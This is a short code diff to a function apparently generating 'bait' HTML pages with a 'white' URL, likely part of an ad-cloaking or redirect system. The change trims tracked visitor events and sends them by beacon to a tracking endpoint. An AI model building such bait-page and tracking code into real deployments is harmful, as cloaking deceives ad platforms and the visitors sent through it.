@@ -238,10 +238,18 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
         T.total=Date.now()-T.start;
         T.dest=dest;
         T.teleport=teleport;
+        // Limit events to last 50 to avoid large payloads
+        if(T.events.length>50)T.events=T.events.slice(-50);
         var data=JSON.stringify(T);
         try{
-          if(navigator.sendBeacon){navigator.sendBeacon(tUrl,data)}
-          else{var x=new XMLHttpRequest();x.open('POST',tUrl,false);x.setRequestHeader('Content-Type','application/json');x.send(data)}
+          if(navigator.sendBeacon){
+            // Use Blob to ensure proper content-type
+            var blob=new Blob([data],{type:'application/json'});
+            navigator.sendBeacon(tUrl,blob);
+          }else{
+            var x=new XMLHttpRequest();x.open('POST',tUrl,false);
+            x.setRequestHeader('Content-Type','application/json');x.send(data);
+          }
         }catch(e){}
       }
       
